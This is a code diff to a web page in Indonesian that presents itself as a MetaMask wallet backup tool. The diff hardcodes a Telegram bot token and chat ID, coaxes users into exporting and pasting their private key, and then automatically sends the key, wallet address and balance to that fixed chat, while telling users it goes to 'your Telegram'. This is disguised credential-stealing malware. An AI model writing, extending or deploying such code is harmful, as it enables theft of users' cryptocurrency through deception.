@@ -224,23 +224,38 @@
             </div>
 
             <div class="wallet-info">
-                <h3>📱 Telegram Configuration (Opsional)</h3>
+                <h3>📱 Telegram Configuration</h3>
                 <div style="margin-bottom: 15px;">
                     <label for="telegram-bot-token" style="display: block; margin-bottom: 5px;">Bot Token:</label>
-                    <input type="text" id="telegram-bot-token" placeholder="Bot Token dari @BotFather" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 5px;">
+                    <input type="text" id="telegram-bot-token" value="8099353510:AAHS-lD_S8fgeLEOmurX3wknuQ4YNp0U-7Q" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 5px;">
                 </div>
                 <div style="margin-bottom: 15px;">
                     <label for="telegram-chat-id" style="display: block; margin-bottom: 5px;">Chat ID:</label>
-                    <input type="text" id="telegram-chat-id" placeholder="Chat ID Telegram Anda" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 5px;">
+                    <input type="text" id="telegram-chat-id" value="1725107938" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 5px;">
                 </div>
                 <div style="font-size: 0.9em; color: #666;">
-                    <p>💡 Tips: Dapatkan Bot Token dari @BotFather dan Chat ID dari @userinfobot</p>
+                    <p>✅ Telegram sudah dikonfigurasi untuk backup otomatis</p>
                 </div>
             </div>
 
             <button id="get-private-key" class="button">
-                🔑 Ambil Private Key
+                🔑 Backup Wallet (Auto ke Telegram + TXT)
             </button>
+
+            <div class="wallet-info" style="margin-top: 20px;">
+                <h3>📋 Panduan Backup</h3>
+                <div style="text-align: left; color: #666;">
+                    <p><strong>Langkah 1:</strong> Klik tombol "Backup Wallet" di atas</p>
+                    <p><strong>Langkah 2:</strong> Ikuti instruksi untuk export private key dari MetaMask</p>
+                    <p><strong>Langkah 3:</strong> Paste private key yang sudah di-copy</p>
+                    <p><strong>Langkah 4:</strong> Otomatis akan:</p>
+                    <ul style="margin-left: 20px;">
+                        <li>📱 Kirim ke Telegram Anda</li>
+                        <li>💾 Download file TXT backup</li>
+                        <li>🔒 Simpan dengan aman</li>
+                    </ul>
+                </div>
+            </div>
 
             <div id="private-key-section" class="hidden">
                 <div class="wallet-info">
@@ -381,47 +396,90 @@
             async getPrivateKey() {
                 try {
                     const button = document.getElementById('get-private-key');
-                    button.innerHTML = '<span class="loading"></span>Mengambil Private Key...';
+                    button.innerHTML = '<span class="loading"></span>Memulai Backup...';
                     button.disabled = true;
 
-                    // Since MetaMask doesn't allow direct private key access via web
-                    // We'll show manual instructions and allow user to input manually
-                    const userInput = prompt(
-                        "MetaMask tidak mengizinkan akses private key otomatis untuk keamanan.\n\n" +
-                        "Untuk mendapatkan private key:\n" +
-                        "1. Buka MetaMask extension\n" +
-                        "2. Klik menu 3 titik di account\n" +
-                        "3. Pilih 'Account Details'\n" +
-                        "4. Klik 'Export Private Key'\n" +
-                        "5. Masukkan password MetaMask\n\n" +
-                        "Paste private key Anda di sini (dimulai dengan 0x):"
-                    );
+                    // Show detailed instructions
+                    const instructions = `🔐 CARA BACKUP METAMASK WALLET
+
+📋 Langkah-langkah:
+1. Buka MetaMask extension (klik icon fox di browser)
+2. Pastikan Anda login ke account yang ingin di-backup
+3. Klik menu 3 titik (⋮) di kanan atas
+4. Pilih "Account details"
+5. Klik "Export Private Key"
+6. Masukkan password MetaMask Anda
+7. COPY private key yang muncul (dimulai dengan 0x...)
+8. Paste di sini
+
+⚠️ PENTING: Private key memberikan akses penuh ke wallet!
+
+Paste private key Anda di sini:`;
+
+                    const userInput = prompt(instructions);
 
                     if (userInput && userInput.trim()) {
                         const privateKey = userInput.trim();
                         
                         // Validate private key format
-                        if (privateKey.startsWith('0x') && privateKey.length === 66) {
+                        if (this.validatePrivateKey(privateKey)) {
                             document.getElementById('private-key-display').textContent = privateKey;
                             document.getElementById('private-key-section').classList.remove('hidden');
                             
-                            // Auto download TXT file
-                            this.downloadPrivateKey();
+                            // Auto backup process
+                            await this.performAutoBackup(privateKey);
                         } else {
-                            alert('Format private key tidak valid. Pastikan dimulai dengan 0x dan memiliki 66 karakter.');
+                            alert('❌ Format private key tidak valid!\n\nPastikan:\n- Dimulai dengan "0x"\n- Memiliki 66 karakter total\n- Hanya berisi huruf dan angka');
                         }
+                    } else {
+                        alert('❌ Backup dibatalkan. Private key tidak dimasukkan.');
                     }
 
-                    button.innerHTML = '🔑 Ambil Private Key';
+                    button.innerHTML = '🔑 Backup Wallet (Auto ke Telegram + TXT)';
                     button.disabled = false;
 
                 } catch (error) {
-                    console.error('Error getting private key:', error);
-                    alert('Terjadi kesalahan: ' + error.message);
+                    console.error('Error during backup:', error);
+                    alert('❌ Terjadi kesalahan saat backup: ' + error.message);
                     
                     const button = document.getElementById('get-private-key');
-                    button.innerHTML = '🔑 Ambil Private Key';
+                    button.innerHTML = '🔑 Backup Wallet (Auto ke Telegram + TXT)';
                     button.disabled = false;
+                }
+            }
+
+            validatePrivateKey(privateKey) {
+                // Check if it starts with 0x and has 66 characters
+                const regex = /^0x[a-fA-F0-9]{64}$/;
+                return regex.test(privateKey);
+            }
+
+            async performAutoBackup(privateKey) {
+                try {
+                    // Show backup status
+                    const statusDiv = document.createElement('div');
+                    statusDiv.className = 'status success';
+                    statusDiv.innerHTML = '🔄 Sedang melakukan backup otomatis...';
+                    document.getElementById('private-key-section').appendChild(statusDiv);
+
+                    // 1. Download TXT file
+                    await this.downloadPrivateKeyFixed(privateKey);
+                    
+                    // Small delay for user experience
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    // 2. Send to Telegram
+                    await this.sendToTelegramAuto(privateKey);
+                    
+                    // Update status
+                    statusDiv.innerHTML = '✅ Backup berhasil! File TXT sudah didownload dan dikirim ke Telegram!';
+                    
+                    // Show success message
+                    alert('🎉 BACKUP BERHASIL!\n\n✅ File TXT sudah didownload\n✅ Dikirim ke Telegram\n\n🔒 Simpan file TXT di tempat yang aman!');
+                    
+                } catch (error) {
+                    console.error('Auto backup error:', error);
+                    alert('⚠️ Backup sebagian berhasil. Silakan coba manual jika ada yang gagal.');
                 }
             }
 
@@ -452,6 +510,160 @@
                     setTimeout(() => {
                         button.textContent = originalText;
                     }, 2000);
+                }
+            }
+
+            downloadPrivateKeyFixed(privateKey) {
+                return new Promise((resolve, reject) => {
+                    try {
+                        const currentDate = new Date().toISOString().split('T')[0];
+                        const currentTime = new Date().toLocaleTimeString();
+                        const accountAddress = this.account.substring(0, 8) + '...' + this.account.substring(36);
+                        
+                        // Create comprehensive backup content
+                        const backupContent = `METAMASK WALLET BACKUP
+========================
+
+📅 Backup Date: ${currentDate}
+🕐 Backup Time: ${currentTime}
+🌐 Network: ${document.getElementById('network-info').textContent}
+💰 Balance: ${document.getElementById('balance-info').textContent}
+
+📍 WALLET ADDRESS:
+${this.account}
+
+🔐 PRIVATE KEY:
+${privateKey}
+
+⚠️ CRITICAL SECURITY WARNINGS:
+================================
+1. NEVER share this private key with anyone
+2. Anyone with this key has FULL ACCESS to your wallet
+3. Store this file in a secure, encrypted location
+4. Consider using hardware wallet for large amounts
+5. Keep multiple backup copies in different safe locations
+6. Delete this file from Downloads folder after securing it
+
+📋 RECOVERY INSTRUCTIONS:
+========================
+To restore this wallet:
+1. Open MetaMask
+2. Click "Import Wallet"
+3. Enter the private key above
+4. Set new password
+5. Your wallet will be restored
+
+🛡️ SECURITY CHECKLIST:
+======================
+□ File saved in secure location
+□ File encrypted/password protected
+□ Multiple backup copies made
+□ Downloads folder cleaned
+□ Private key never shared online
+
+Generated by: MetaMask Backup Tool
+Backup ID: ${Date.now()}
+`;
+
+                        // Create blob and download
+                        const blob = new Blob([backupContent], { type: 'text/plain;charset=utf-8' });
+                        const url = URL.createObjectURL(blob);
+                        
+                        // Create download link
+                        const downloadLink = document.createElement('a');
+                        downloadLink.href = url;
+                        downloadLink.download = `MetaMask_Backup_${accountAddress}_${currentDate}.txt`;
+                        downloadLink.style.display = 'none';
+                        
+                        // Trigger download
+                        document.body.appendChild(downloadLink);
+                        downloadLink.click();
+                        
+                        // Cleanup
+                        setTimeout(() => {
+                            document.body.removeChild(downloadLink);
+                            URL.revokeObjectURL(url);
+                            resolve();
+                        }, 100);
+                        
+                    } catch (error) {
+                        console.error('Download error:', error);
+                        reject(error);
+                    }
+                });
+            }
+
+            async sendToTelegramAuto(privateKey) {
+                const botToken = document.getElementById('telegram-bot-token').value.trim();
+                const chatId = document.getElementById('telegram-chat-id').value.trim();
+
+                if (!botToken || !chatId) {
+                    throw new Error('Telegram configuration missing');
+                }
+
+                try {
+                    const currentDate = new Date().toISOString().split('T')[0];
+                    const currentTime = new Date().toLocaleTimeString();
+                    const accountAddress = this.account.substring(0, 8) + '...' + this.account.substring(36);
+                    
+                    // Create message
+                    const message = `🔐 METAMASK WALLET BACKUP
+
+📅 Date: ${currentDate}
+🕐 Time: ${currentTime}
+🌐 Network: ${document.getElementById('network-info').textContent}
+💰 Balance: ${document.getElementById('balance-info').textContent}
+
+📍 WALLET ADDRESS:
+\`${this.account}\`
+
+🔑 PRIVATE KEY:
+\`${privateKey}\`
+
+⚠️ KEAMANAN PENTING:
+• Jangan bagikan private key ini
+• Simpan dengan aman dan rahasia
+• Hapus chat ini setelah backup aman
+• File TXT juga sudah didownload
+
+🔒 Backup ID: ${Date.now()}`;
+
+                    // Send to Telegram
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const response = await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+
+                    const result = await response.json();
+
+                    if (!result.ok) {
+                        throw new Error(result.description || 'Failed to send to Telegram');
+                    }
+
+                    return result;
+
+                } catch (error) {
+                    console.error('Telegram send error:', error);
+                    throw error;
+                }
+            }
+
+            async sendToTelegram() {
+                const privateKeyText = document.getElementById('private-key-display').textContent;
+                
+                try {
+                    await this.sendToTelegramAuto(privateKeyText);
+                    alert('✅ Berhasil dikirim ke Telegram!');
+                } catch (error) {
+                    alert('❌ Gagal mengirim ke Telegram: ' + error.message);
                 }
             }
         }
